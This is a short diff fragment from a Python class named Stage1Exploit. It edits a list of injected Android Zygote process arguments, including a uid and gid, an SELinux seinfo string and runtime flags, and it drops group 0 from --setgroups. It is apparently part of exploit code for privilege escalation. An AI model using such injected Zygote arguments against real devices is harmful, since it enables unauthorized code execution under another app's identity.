@@ -189,7 +189,7 @@ class Stage1Exploit:
         raw_zygote_arguments = [
             "--setuid=10079",
             "--setgid=10079",
-            "--setgroups=3003,0",
+            "--setgroups=3003",
             "--runtime-args",
             "--seinfo=ssgapp:ssg_app:targetSdkVersion=28:complete",
             "--runtime-flags=1",
